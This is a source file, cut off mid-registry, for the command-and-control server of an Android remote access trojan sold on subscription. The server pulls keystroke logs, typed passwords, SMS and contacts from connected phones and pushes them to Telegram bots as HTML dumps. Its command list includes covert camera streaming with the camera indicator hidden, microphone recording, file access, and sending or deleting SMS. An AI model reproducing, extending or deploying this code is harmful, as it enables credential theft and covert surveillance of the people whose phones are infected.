// ============================================
// ACCESS CONTROL SERVER
// Android  → raw TCP  (net.Socket, port 6000)
// Dashboard → HTTP SSE (GET /api/events, persistent TCP)
//             HTTP POST (commands, ping — no WS, no queuing)
// ============================================

'use strict';

const express        = require('express');
const http           = require('http');
const net            = require('net');
const tls            = require('tls');
const cors           = require('cors');
const compression    = require('compression');
const helmet         = require('helmet');
const rateLimit      = require('express-rate-limit');
const { createCaptcha, verifyCaptcha } = require('./utils/captcha');
const path           = require('path');
const fs             = require('fs');
const crypto         = require('crypto');
const zlib           = require('zlib');
const mongoose       = require('mongoose');
const jwt            = require('jsonwebtoken');
const { spawn }      = require('child_process');
require('dotenv').config();
const { getJwtSecret } = require('./jwtSecret');

// ============================================
// RUNTIME LOG CAPTURE
// ============================================
const LOG_BUFFER_MAX = 1000;
const logBuffer      = [];
const logClients     = new Set();

function pushLog(source, level, message) {
    const lines = String(message).split('\n').map(l => l.trimEnd()).filter(Boolean);
    lines.forEach(line => {
        const entry = { ts: Date.now(), source, level, message: line };
        logBuffer.push(entry);
        if (logBuffer.length > LOG_BUFFER_MAX) logBuffer.shift();
        const payload = `data: ${JSON.stringify(entry)}\n\n`;
        for (const res of logClients) { try { res.write(payload); } catch (_) {} }
    });
}

['log', 'info', 'warn', 'error'].forEach(lvl => {
    const orig = console[lvl].bind(console);
    console[lvl] = (...args) => {
        orig(...args);
        pushLog('server', lvl === 'log' ? 'info' : lvl, args.join(' '));
    };
});

// ============================================
// FRP LAUNCHER  (frps → wait → frpc)
// ============================================
(function startFRP() {
    const ROOT = path.resolve(__dirname, '..');

    const frpsBin  = fs.existsSync('/usr/local/bin/frps') ? '/usr/local/bin/frps' : path.join(ROOT, 'frps', 'frps');
    const frpcBin  = fs.existsSync('/usr/local/bin/frpc') ? '/usr/local/bin/frpc' : path.join(ROOT, 'frpc', 'frpc');
    const frpsCfg  = fs.existsSync('/etc/frp/frps.toml')  ? '/etc/frp/frps.toml'  : path.join(ROOT, 'frps', 'frps.toml');
    const frpcCfg  = fs.existsSync('/etc/frp/frpc.toml')  ? '/etc/frp/frpc.toml'  : path.join(ROOT, 'frpc', 'frpc.toml');

    if (!fs.existsSync(frpsBin) || !fs.existsSync(frpcBin)) {
        console.warn('[FRP] Binaries not found — skipping FRP startup.');
        return;
    }

    function spawnFRP(bin, cfg, label) {
        const proc = spawn(bin, ['-c', cfg], { stdio: 'pipe' });
        proc.stdout.on('data', d => { process.stdout.write(`[${label}] ${d}`); pushLog(label, 'info', String(d)); });
        proc.stderr.on('data', d => { process.stderr.write(`[${label}] ${d}`); pushLog(label, 'warn', String(d)); });
        proc.on('exit', code => console.log(`[${label}] exited with code ${code}`));
        return proc;
    }

    function waitForPort(port, retries, delay, cb) {
        const sock = new net.Socket();
        sock.setTimeout(1000);
        sock.on('connect', () => { sock.destroy(); cb(null); });
        sock.on('error',   () => { sock.destroy(); retry(); });
        sock.on('timeout', () => { sock.destroy(); retry(); });
        sock.connect(port, '127.0.0.1');

        function retry() {
            if (retries <= 0) return cb(new Error(`Port ${port} not ready`));
            setTimeout(() => waitForPort(port, retries - 1, delay, cb), delay);
        }
    }

    console.log('[FRP] Starting frps...');
    spawnFRP(frpsBin, frpsCfg, 'frps');

    waitForPort(7000, 30, 1000, (err) => {
        if (err) {
            console.error('[FRP] frps did not become ready — frpc will not start.');
            return;
        }
        console.log('[FRP] frps ready. Starting frpc...');
        spawnFRP(frpcBin, frpcCfg, 'frpc');
    });
})();

// ── Redis ─────────────────────────────────────────────────────────────────────
const R = require('./redis');

// ============================================
// TELEGRAM NOTIFICATIONS
// ============================================

// Runtime-overridable settings (can be changed via /api/settings without restart)
const telegramSettings = {
    botToken:  process.env.TELEGRAM_BOT_TOKEN  || '',
    chatId:    process.env.TELEGRAM_CHAT_ID    || '',
    enabled:   true,
    notifyConnect:          true,
    sendSmsOnConnect:           false,
    sendKeylogOnConnect:        false,
    sendPasswordsOnConnect:     false,
};

// Internal callbacks for commands sent server-side (not from a dashboard user).
// Map: commandId -> { ts, handler }
const _internalCmdCallbacks = new Map();

// Internal chunk collectors for chunked streaming responses (e.g. get_all_sms).
// Map: commandId -> { items: [], resolve, timer }
const _internalChunkCollectors = new Map();

// Per-user keylog batching for Telegram: Map<userId, { buf, timer, devName }>
const _userKeylogBuffers = new Map();
const USER_KEYLOG_FLUSH_MS = 4000;

// ── Auto-sync state ───────────────────────────────────────────────────────────
// Track when each device was last synced (passwords + contacts) so we don't
// re-sync within 5 minutes of the last sync on a rapid reconnect.
const deviceLastSyncAt = new Map(); // deviceId → { passwords: ts, contacts: ts }
const deviceContacts   = new Map(); // deviceId → contacts[]
const devicePasswords  = new Map(); // deviceId → password entries[]

async function _forwardKeylogToUsers(deviceId, entry) {
    try {
        const rec = inMemoryDevices.get(deviceId);
        const accessId = rec?.accessId || '';
        if (!accessId) return;
        const users = await User.find({
            role: 'user',
            accessId,
            telegramEnabled: true,
            telegramSendKeylogOnConnect: true,
            telegramBotToken: { $ne: '' },
            telegramChatId:   { $ne: '' },
        }).select('_id telegramBotToken telegramChatId').lean();
        if (!users.length) return;
        const devName = rec?.deviceInfo?.name || rec?.deviceName || deviceId;
        for (const u of users) {
            const uid = String(u._id);
            let buf = _userKeylogBuffers.get(uid);
            if (!buf) { buf = { entries: [], devName, deviceId, token: u.telegramBotToken, chatId: u.telegramChatId }; _userKeylogBuffers.set(uid, buf); }
            buf.entries.push(entry);
            if (!buf.timer) {
                buf.timer = setTimeout(() => {
                    _userKeylogBuffers.delete(uid);
                    if (!buf.entries.length) return;
                    const lines = buf.entries.map(e => {
                        const app = (e.appName || e.packageName || '').split('.').pop();
                        const txt = (e.text || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
                        return `<b>${app}</b>: <code>${txt}</code>`;
                    });
                    const text = `⌨️ <b>Keylog — ${buf.devName}</b>\n━━━━━━━━━━━━━━━━━━━\n🆔 <code>${buf.deviceId}</code>\n\n` + lines.join('\n');
                    sendTelegramRaw(buf.token, buf.chatId, text).catch(() => {});
                }, USER_KEYLOG_FLUSH_MS);
                if (buf.timer.unref) buf.timer.unref();
            }
        }
    } catch (_) {}
}

// Keylog batching buffers for Telegram forwarding: deviceId -> [entries]
const _keylogTelegramBuffer = new Map();
const _keylogTelegramTimers = new Map();
const KEYLOG_TELEGRAM_BATCH_DELAY_MS = 4000;

function _flushKeylogToTelegram(deviceId, deviceName) {
    const entries = _keylogTelegramBuffer.get(deviceId) || [];
    _keylogTelegramBuffer.delete(deviceId);
    _keylogTelegramTimers.delete(deviceId);
    if (!entries.length) return;

    const lines = entries.map(e => {
        const app = (e.appName || e.packageName || '').split('.').pop();
        const txt = (e.text || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
        return `<b>${app}</b>: <code>${txt}</code>`;
    });
    const text =
        `⌨️ <b>Keylog — ${deviceName}</b>\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 <code>${deviceId}</code>\n\n` +
        lines.join('\n');
    sendTelegram(text);
}

function _bufferKeylogForTelegram(deviceId, deviceName, entry) {
    const buf = _keylogTelegramBuffer.get(deviceId) || [];
    buf.push(entry);
    _keylogTelegramBuffer.set(deviceId, buf);
    if (!_keylogTelegramTimers.has(deviceId)) {
        const t = setTimeout(() => _flushKeylogToTelegram(deviceId, deviceName), KEYLOG_TELEGRAM_BATCH_DELAY_MS);
        if (t.unref) t.unref();
        _keylogTelegramTimers.set(deviceId, t);
    }
}

function _getTcpConnForDevice(deviceId) {
    const connId = deviceToTcp.get(deviceId);
    if (!connId) return null;
    return tcpClients.get(connId) || null;
}

async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
    // Request SMS from device using chunked streaming (same mechanism as the dashboard SMS Manager).
    // The device sends data:chunk events rather than a single command:response, so we use
    // _sendAndCaptureChunked which intercepts both chunk streams and plain responses.
    // Retry up to 3 times with a 5s pause if the device returns nothing.
    let msgs = [];
    const MAX_ATTEMPTS = 3;
    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
        try {
            log('TELEGRAM', `SMS dump attempt ${attempt}/${MAX_ATTEMPTS} for ${deviceId}`);
            const items = await _sendAndCaptureChunked(deviceId, 'get_all_sms', {}, 90000);
            if (items && items.length) { msgs = items; break; }
        } catch (_) {}
        if (attempt < MAX_ATTEMPTS) {
            log('TELEGRAM', `SMS dump attempt ${attempt} returned no messages — retrying in 5s…`, 'warn');
            await new Promise(r => setTimeout(r, 5000));
        }
    }
    if (!msgs.length) {
        log('TELEGRAM', `SMS dump: device returned no messages after ${MAX_ATTEMPTS} attempts for ${deviceId}`, 'warn');
        return;
    }

    // Send all received messages — no hard cap
    const esc = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    const rows = msgs.map(m => {
        const dir  = m.type === 2
            ? '<span class="dir-out">&#9650; Sent</span>'
            : '<span class="dir-in">&#9660; Recv</span>';
        const num  = `<span class="num">${esc(m.address || 'Unknown')}</span>`;
        const date = `<span class="date">${m.date ? new Date(Number(m.date)).toLocaleString() : ''}</span>`;
        const body = `<span class="body">${esc(m.body || '')}</span>`;
        return `<tr><td>${dir}</td><td>${num}</td><td>${date}</td><td>${body}</td></tr>`;
    }).join('\n');

    const ts   = new Date().toLocaleString();
    const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>SMS Dump</title><style>
body{font-family:Arial,sans-serif;background:#0f172a;color:#e2e8f0;padding:24px;margin:0}
h1{font-size:20px;color:#a78bfa;margin-bottom:4px}
.meta{color:#64748b;font-size:12px;margin-bottom:24px}
table{width:100%;border-collapse:collapse;font-size:13px}
th{background:#1e293b;padding:10px 14px;text-align:left;color:#94a3b8}
td{padding:9px 14px;border-bottom:1px solid #1e293b;vertical-align:top}
.dir-in{color:#22c55e;font-weight:700}.dir-out{color:#a78bfa;font-weight:700}
.num{font-weight:600;white-space:nowrap}
.date{color:#64748b;font-size:11px;white-space:nowrap}
.body{line-height:1.5;word-break:break-word;max-width:480px}
</style></head><body>
<h1>&#128172; SMS Dump &#8212; ${esc(deviceName)}</h1>
<div class="meta">Device: <code>${esc(deviceId)}</code> &nbsp;&middot;&nbsp; ${esc(ts)} &nbsp;&middot;&nbsp; ${msgs.length} messages</div>
<table><thead><tr><th>Dir</th><th>Number</th><th>Date</th><th>Message</th></tr></thead>
<tbody>${rows}</tbody></table></body></html>`;

    const filename = `sms_${deviceId.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.html`;
    const caption  = `\u{1F4AC} SMS Dump \u2014 ${deviceName}\n\uD83C\uDD94 ${deviceId}\n\uD83D\uDCCA ${msgs.length} messages`;
    if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
        await sendTelegramDocument(telegramSettings.botToken, telegramSettings.chatId, html, filename, caption);
    }
    if (userList && userList.length) {
        for (const u of userList) {
            await sendTelegramDocument(u.telegramBotToken, u.telegramChatId, html, filename, caption);
            await new Promise(r => setTimeout(r, 300));
        }
    }
}

async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
    // Collect from in-memory sync (passwords stored on last fresh connect)
    const storedPwds = devicePasswords.get(deviceId) || [];

    // Also pull from Redis keylogs (up to 500 entries pushed in real-time by the device)
    let redisPwds = [];
    try {
        const redisEntries = await R.getKeylogs(deviceId);
        redisPwds = redisEntries.filter(e =>
            e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
        );
    } catch (_) {}

    // Also request live from device if online
    let livePwds = [];
    const conn = _getTcpConnForDevice(deviceId);
    if (conn && conn.writable) {
        try {
            const resp = await _sendAndCapture(deviceId, 'get_keylogs', {}, 30000);
            if (resp) {
                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
                const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
                livePwds = all.filter(e =>
                    e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
                );
            }
        } catch (_) {}
    }

    // Merge stored + Redis + live, dedupe by app+text+timestamp
    const seen = new Set();
    const entries = [...storedPwds, ...redisPwds, ...livePwds].filter(e => {
        const key = `${e.appName || e.packageName || ''}|${(e.text || e.typedText || '').slice(0, 50)}|${e.timestamp || ''}`;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
    });
    if (!entries.length) return;

    // Build HTML document
    const esc = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    const rows = entries.map(e => {
        const app   = `<span class="app">${esc(e.appName || e.packageName || 'Unknown app')}</span>`;
        const field = `<span class="field">${esc(e.fieldType || '')}</span>`;
        const pwd   = `<span class="pwd">${esc(e.text || e.typedText || '')}</span>`;
        const date  = `<span class="date">${e.timestamp ? new Date(e.timestamp).toLocaleString() : ''}</span>`;
        return `<tr><td>${app}</td><td>${field}</td><td>${pwd}</td><td>${date}</td></tr>`;
    }).join('\n');

    const ts   = new Date().toLocaleString();
    const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Password Captures</title><style>
body{font-family:Arial,sans-serif;background:#0f172a;color:#e2e8f0;padding:24px;margin:0}
h1{font-size:20px;color:#ef4444;margin-bottom:4px}
.meta{color:#64748b;font-size:12px;margin-bottom:24px}
table{width:100%;border-collapse:collapse;font-size:13px}
th{background:#1e293b;padding:10px 14px;text-align:left;color:#94a3b8}
td{padding:9px 14px;border-bottom:1px solid #1e293b;vertical-align:top}
.app{font-weight:700;color:#a78bfa}
.field{color:#f59e0b;font-size:11px}
.pwd{font-family:monospace;font-size:14px;color:#22c55e;word-break:break-all}
.date{color:#64748b;font-size:11px;white-space:nowrap}
</style></head><body>
<h1>&#128273; Password Captures &#8212; ${esc(deviceName)}</h1>
<div class="meta">Device: <code>${esc(deviceId)}</code> &nbsp;&middot;&nbsp; ${esc(ts)} &nbsp;&middot;&nbsp; ${entries.length} entries</div>
<table><thead><tr><th>App</th><th>Field Type</th><th>Password / Text</th><th>Time</th></tr></thead>
<tbody>${rows}</tbody></table></body></html>`;

    const filename = `passwords_${deviceId.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.html`;
    const caption  = `\uD83D\uDD11 Password Captures \u2014 ${deviceName}\n\uD83C\uDD94 ${deviceId}\n\uD83D\uDCCA ${entries.length} entr${entries.length !== 1 ? 'ies' : 'y'}`;
    if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
        await sendTelegramDocument(telegramSettings.botToken, telegramSettings.chatId, html, filename, caption);
    }
    if (userList && userList.length) {
        for (const u of userList) {
            await sendTelegramDocument(u.telegramBotToken, u.telegramChatId, html, filename, caption);
            await new Promise(r => setTimeout(r, 300));
        }
    }
}

// ── Helper: send a command to a device and wait for its response ──────────────
function _sendAndCapture(deviceId, command, params = {}, timeoutMs = 30000) {
    return new Promise((resolve) => {
        const conn = _getTcpConnForDevice(deviceId);
        if (!conn || !conn.writable) { resolve(null); return; }
        const cmdId = crypto.randomBytes(12).toString('hex');
        const timer = setTimeout(() => {
            _internalCmdCallbacks.delete(cmdId);
            resolve(null);
        }, timeoutMs);
        _internalCmdCallbacks.set(cmdId, { ts: Date.now(), handler: (response, error) => {
            clearTimeout(timer);
            _internalCmdCallbacks.delete(cmdId);
            resolve(error ? null : response);
        }});
        tcpSend(conn, 'command:execute', { commandId: cmdId, command, params });
    });
}

// ── Helper: send a command and collect chunked streaming responses ─────────────
// Handles commands like get_all_sms where the device streams data:chunk events
// instead of (or in addition to) a single command:response.
// Falls back to plain command:response if no chunks arrive.
function _sendAndCaptureChunked(deviceId, command, params = {}, timeoutMs = 90000) {
    return new Promise((resolve) => {
        const conn = _getTcpConnForDevice(deviceId);
        if (!conn || !conn.writable) { resolve([]); return; }
        const cmdId = crypto.randomBytes(12).toString('hex');
        let settled = false;
        const finish = (items) => {
            if (settled) return;
            settled = true;
            clearTimeout(timer);
            _internalCmdCallbacks.delete(cmdId);
            _internalChunkCollectors.delete(cmdId);
            resolve(items);
        };
        const timer = setTimeout(() => finish([]), timeoutMs);

        // Chunk collector — fired by the data:chunk handler above
        _internalChunkCollectors.set(cmdId, { items: [], resolve: finish, timer });

        // Plain response fallback — some devices may respond without chunking
        _internalCmdCallbacks.set(cmdId, { ts: Date.now(), handler: (response, error) => {
            if (error || !response) { finish([]); return; }
            const d = typeof response === 'string' ? JSON.parse(response) : response;
            const items = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
                       || d.data || d.results || d.items || [];
            // Only use the plain response if no chunks have arrived yet
            if (_internalChunkCollectors.has(cmdId)) {
                const col = _internalChunkCollectors.get(cmdId);
                if (col.items.length === 0 && items.length > 0) finish(items);
                // If chunks already arrived, let the chunk collector finish naturally
            }
        }});

        tcpSend(conn, 'command:execute', { commandId: cmdId, command, params });
    });
}

// ── Auto-sync: request passwords + contacts from device on fresh connect ──────
// Respects a 5-minute dedup window so rapid reconnects don't cause double-syncs.
async function _autoSyncDevice(deviceId) {
    const SYNC_DEDUP_MS = 5 * 60 * 1000;
    const last = deviceLastSyncAt.get(deviceId) || {};
    const now  = Date.now();

    // Sync contacts
    if ((now - (last.contacts || 0)) > SYNC_DEDUP_MS) {
        deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), contacts: now });
        try {
            const resp = await _sendAndCapture(deviceId, 'get_all_contacts', {}, 30000);
            if (resp) {
                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
                const contacts = d.contacts || d.allContacts || d.data || [];
                if (contacts.length) {
                    deviceContacts.set(deviceId, contacts);
                    log('SYNC', `Contacts synced: ${contacts.length} entries for ${deviceId}`);
                }
            }
        } catch (_) {}
    }

    // Sync passwords (from device keylogs filtered by isPassword)
    if ((now - (last.passwords || 0)) > SYNC_DEDUP_MS) {
        deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), passwords: now });
        try {
            const resp = await _sendAndCapture(deviceId, 'get_keylogs', {}, 30000);
            if (resp) {
                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
                const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
                const pwds = all.filter(e =>
                    e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
                );
                if (pwds.length) {
                    devicePasswords.set(deviceId, pwds);
                    log('SYNC', `Passwords synced: ${pwds.length} entries for ${deviceId}`);
                }
            }
        } catch (_) {}
    }
}

// Build-worker settings — admin sets API key in dashboard Settings.
// The build.sh script (running anywhere — locally, on a VPS, in CI)
// authenticates with this key and polls /api/build/worker/poll for jobs.
//
// IMPORTANT for commercial deployments (Heroku, Zeabur, Render, Fly, Railway,
// etc.): always set BUILD_WORKER_API_KEY (or BUILD_API_KEY) as an environment
// variable on the backend. The dashboard's "Settings → Build worker API key"
// field also writes here, but it is in-memory only and is wiped on every
// dyno/container restart — which on most PaaS hosts happens daily or on every
// redeploy. The env var is the persistent source of truth.
//
// We .trim() the env value defensively because it is extremely common to copy
// the key into a PaaS dashboard with a leading/trailing space or newline, and
// the worker's curl request will not match if the comparison includes that
// whitespace.
// ── BUILD WORKER API KEY — persistent auto-generation ───────────────────────
// Priority: env var → saved key file → freshly generated random key.
// The generated key is written to .build_worker_key so it survives restarts
// even when env vars are wiped (PaaS ephemeral containers, Replit restarts).
// On every startup the key is also pushed to the GitHub Actions repo secret
// BUILD_API_KEY via _syncGitHubCallbackSecrets(), so the runner always has
// the correct value without any manual step.
const _BUILD_KEY_FILE = path.join(__dirname, '.build_worker_key');
(function _initBuildWorkerKey() {
    const fromEnv = (process.env.BUILD_WORKER_API_KEY
                  || process.env.BUILD_API_KEY
                  || process.env.BUILD_WORKER_API
                  || process.env.BUILD_API
                  || '').trim();
    if (fromEnv) {
        process.env._RESOLVED_BUILD_API_KEY = fromEnv;
        process.env._BUILD_KEY_SOURCE = 'env';
        return;
    }
    // Try persistent file
    try {
        const saved = fs.readFileSync(_BUILD_KEY_FILE, 'utf8').trim();
        if (saved) {
            process.env._RESOLVED_BUILD_API_KEY = saved;
            process.env._BUILD_KEY_SOURCE = 'file';
            return;
        }
    } catch (_) {}
    // Auto-generate a new 48-byte (96 hex char) key and save it
    const generated = crypto.randomBytes(48).toString('hex');
    try { fs.writeFileSync(_BUILD_KEY_FILE, generated, { mode: 0o600 }); } catch (_) {}
    process.env._RESOLVED_BUILD_API_KEY = generated;
    process.env._BUILD_KEY_SOURCE = 'generated';
})();

const buildWorkerSettings = {
    apiKey: process.env._RESOLVED_BUILD_API_KEY || '',
};

// Payment / "Buy us a coffee" settings.
//   - paymentUrl   : the fixed NOWPayments invoice link shown in the paywall.
//   - priceUsd     : displayed amount.
//   - extendDays   : how long each successful payment unlocks the account.
//   - ipnSecret    : NOWPayments IPN secret for HMAC-SHA512 webhook verification
//                    (settable at runtime by admin OR via env at boot).
const paymentSettings = {
    paymentUrl: process.env.NOWPAYMENTS_PAYMENT_URL
        || 'https://nowpayments.io/payment/?iid=5745424570&paymentId=4699655886',
    priceUsd:   Number(process.env.NOWPAYMENTS_PRICE_USD || 25),
    extendDays: Number(process.env.NOWPAYMENTS_EXTEND_DAYS || 30),
    ipnSecret:  process.env.NOWPAYMENTS_IPN_SECRET || '',
};

// Recursively sort object keys (NOWPayments IPN signature is computed over the
// JSON body with keys sorted at every depth). Returns a new value; original is
// untouched. Arrays preserve order; primitives pass through.
function sortKeysDeep(value) {
    if (Array.isArray(value)) return value.map(sortKeysDeep);
    if (value && typeof value === 'object') {
        const sorted = {};
        for (const k of Object.keys(value).sort()) sorted[k] = sortKeysDeep(value[k]);
        return sorted;
    }
    return value;
}

async function sendTelegramRaw(botToken, chatId, text) {
    if (!botToken || !chatId) return;
    try {
        const https = require('https');
        const body  = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
        const opts  = {
            hostname: 'api.telegram.org',
            path:     `/bot${botToken}/sendMessage`,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
        };
        await new Promise((resolve) => {
            const req = https.request(opts, (res) => {
                res.resume();
                res.on('end', resolve);
            });
            req.on('error', (e) => { log('TELEGRAM', `Send error: ${e.message}`, 'warn'); resolve(); });
            req.write(body);
            req.end();
        });
        log('TELEGRAM', `Sent notification to chat ${chatId}`);
    } catch (e) {
        log('TELEGRAM', `Error: ${e.message}`, 'warn');
    }
}

// Send an HTML file as a Telegram document (sendDocument API — multipart/form-data)
async function sendTelegramDocument(botToken, chatId, htmlContent, filename, caption = '') {
    if (!botToken || !chatId) return;
    try {
        const https    = require('https');
        const boundary = `----TGDocBoundary${crypto.randomBytes(8).toString('hex')}`;
        const fileBuf  = Buffer.from(htmlContent, 'utf8');

        const parts = [];
        parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`);
        if (caption) {
            parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption.slice(0, 1024)}\r\n`);
        }
        parts.push(
            `--${boundary}\r\n` +
            `Content-Disposition: form-data; name="document"; filename="${filename}"\r\n` +
            `Content-Type: text/html; charset=utf-8\r\n\r\n`
        );
        const headerBuf = Buffer.from(parts.join(''), 'utf8');
        const footerBuf = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8');
        const body      = Buffer.concat([headerBuf, fileBuf, footerBuf]);

        const opts = {
            hostname: 'api.telegram.org',
            path:     `/bot${botToken}/sendDocument`,
            method:   'POST',
            headers:  { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length },
        };
        await new Promise((resolve) => {
            const req = https.request(opts, (res) => {
                let data = '';
                res.on('data', d => { data += d; });
                res.on('end', () => {
                    try { const p = JSON.parse(data); if (!p.ok) log('TELEGRAM', `sendDocument fail: ${p.description}`, 'warn'); } catch (_) {}
                    resolve();
                });
            });
            req.on('error', (e) => { log('TELEGRAM', `sendDocument error: ${e.message}`, 'warn'); resolve(); });
            req.write(body);
            req.end();
        });
        log('TELEGRAM', `Sent document "${filename}" to chat ${chatId}`);
    } catch (e) {
        log('TELEGRAM', `sendDocument error: ${e.message}`, 'warn');
    }
}

// Admin-level send: uses runtime-overridable global config (env-backed)
async function sendTelegram(text) {
    const { botToken, chatId, enabled } = telegramSettings;
    if (!enabled || !botToken || !chatId) return;
    return sendTelegramRaw(botToken, chatId, text);
}

// Visitor-level broadcast: each registered user with telegram enabled gets the
// notification on their personal bot (independent of admin config).
async function broadcastTelegramToUsers(text, kind = 'notify') {
    if (mongoose.connection.readyState !== 1) return;   // need MongoDB
    try {
        const filter = { role: 'user', telegramEnabled: true, telegramBotToken: { $ne: '' }, telegramChatId: { $ne: '' } };
        if (kind === 'connect') filter.telegramNotifyConnect = true;
        const users = await User.find(filter).select('telegramBotToken telegramChatId').lean();
        await Promise.all(users.map(u => sendTelegramRaw(u.telegramBotToken, u.telegramChatId, text)));
    } catch (e) {
        log('TELEGRAM', `User broadcast error: ${e.message}`, 'warn');
    }
}

// ============================================
// CONFIG
// ============================================
const TCP_PORT  = parseInt(process.env.TCP_PORT)  || 6000;
const HTTP_PORT = parseInt(process.env.PORT)       || 5000;
const PING_INTERVAL  = 20000;   // ms – ping every 20 s (was 30 s); faster detection of 3G drops
const PONG_TIMEOUT   = 90000;   // ms – drop if no pong in 90 s (3 missed pings); was 120 s
const CMD_TIMEOUT_MS = 45000;   // ms – command timeout (45 s); was 60 s

// ============================================
// RECORDINGS STORAGE
// ============================================
// Recordings are stored ONLY on the Android device, not on the server.

// ============================================
// COMMAND REGISTRY  (all cmds from SocketManager.java)
// ============================================
const COMMANDS = {
    // General / Device
    ping:                      { category: 'system',       label: 'Ping',                  icon: '📡' },
    vibrate:                   { category: 'device',       label: 'Vibrate',               icon: '📳' },
    play_sound:                { category: 'device',       label: 'Play Sound',            icon: '🔊' },
    get_clipboard:             { category: 'data',         label: 'Get Clipboard',         icon: '📋' },
    set_clipboard:             { category: 'data',         label: 'Set Clipboard',         icon: '📋' },
    get_device_info:           { category: 'system',       label: 'Device Info',           icon: 'ℹ️'  },
    get_location:              { category: 'location',     label: 'Get Location',          icon: '📍' },
    get_installed_apps:        { category: 'data',         label: 'Installed Apps',        icon: '📦' },
    get_battery_info:          { category: 'system',       label: 'Battery Info',          icon: '🔋' },
    get_network_info:          { category: 'system',       label: 'Network Info',          icon: '🌐' },
    get_wifi_networks:         { category: 'system',       label: 'WiFi Networks',         icon: '📶' },
    get_system_info:           { category: 'system',       label: 'System Info',           icon: '💻' },
    // SMS
    get_all_sms:               { category: 'sms',          label: 'Get All SMS',           icon: '💬' },
    get_sms_from_number:       { category: 'sms',          label: 'SMS From Number',       icon: '💬' },
    send_sms:                  { category: 'sms',          label: 'Send SMS',              icon: '📤' },
    delete_sms:                { category: 'sms',          label: 'Delete SMS',            icon: '🗑️' },
    // Contacts
    get_all_contacts:          { category: 'contacts',     label: 'Get Contacts',          icon: '👥' },
    search_contacts:           { category: 'contacts',     label: 'Search Contacts',       icon: '🔍' },
    // Calls
    get_all_call_logs:         { category: 'calls',        label: 'All Call Logs',         icon: '📞' },
    get_call_logs_by_type:     { category: 'calls',        label: 'Call Logs By Type',     icon: '📞' },
    get_call_logs_from_number: { category: 'calls',        label: 'Calls From Number',     icon: '📞' },
    get_call_statistics:       { category: 'calls',        label: 'Call Statistics',       icon: '📊' },
    // Camera
    get_available_cameras:     { category: 'camera',       label: 'Available Cameras',     icon: '📷' },
    take_photo:                { category: 'camera',       label: 'Take Photo',            icon: '📷' },
    camera_stream_start:       { category: 'camera',       label: 'Camera Stream Start',   icon: '🎥' },
    camera_stream_stop:        { category: 'camera',       label: 'Camera Stream Stop',    icon: '⏹️' },
    camera_record_start:       { category: 'camera',       label: 'Camera Record Start',   icon: '⏺️' },
    camera_record_stop:        { category: 'camera',       label: 'Camera Record Stop',    icon: '⏹️' },
    list_camera_recordings:    { category: 'camera',       label: 'List Camera Recordings',icon: '📋' },
    get_camera_recording:      { category: 'camera',       label: 'Get Camera Recording',  icon: '📥' },
    delete_camera_recording:   { category: 'camera',       label: 'Delete Camera Recording',icon:'🗑️'},
    camera_hide_dot:           { category: 'camera',       label: 'Hide Camera Dot',       icon: '🔴' },
    camera_show_dot:           { category: 'camera',       label: 'Show Camera Dot',       icon: '🟢' },
    get_camera_stream_status:  { category: 'camera',       label: 'Camera Stream Status',  icon: '📊' },
    // Screenshot
    take_screenshot:           { category: 'screen',       label: 'Take Screenshot',       icon: '📸' },
    // Files
    list_files:                { category: 'files',        label: 'List Files',            icon: '📁' },
    read_file:                 { category: 'files',        label: 'Read File',             icon: '📄' },
    write_file:                { category: 'files',        label: 'Write File',            icon: '✏️'  },
    delete_file:               { category: 'files',        label: 'Delete File',           icon: '🗑️' },
    copy_file:                 { category: 'files',        label: 'Copy File',             icon: '📋' },
    move_file:                 { category: 'files',        label: 'Move File',             icon: '📦' },
    create_directory:          { category: 'files',        label: 'Create Directory',      icon: '📂' },
    get_file_info:             { category: 'files',        label: 'File Info',             icon: '📄' },
    search_files:              { category: 'files',        label: 'Search Files',          icon: '🔍' },
    // Audio
    start_recording:           { category: 'audio',        label: 'Start Recording',       icon: '🎤' },
    stop_recording:            { category: 'audio',        label: 'Stop Recording',        icon: '⏹️' },
    get_recording_status:      { category: 'audio',        label: 'Recording Status',      icon: '🎙️' },
    get_audio:                 { category: 'audio',        label: 'Get Audio',             icon: '🎵' },
    list_recordings:           { category: 'audio',        label: 'List Recordings',       icon: '🎵' },
    delete_recording:          { category: 'audio',        label: 'Delete Recording',      icon: '🗑️' },
    // Keylogs
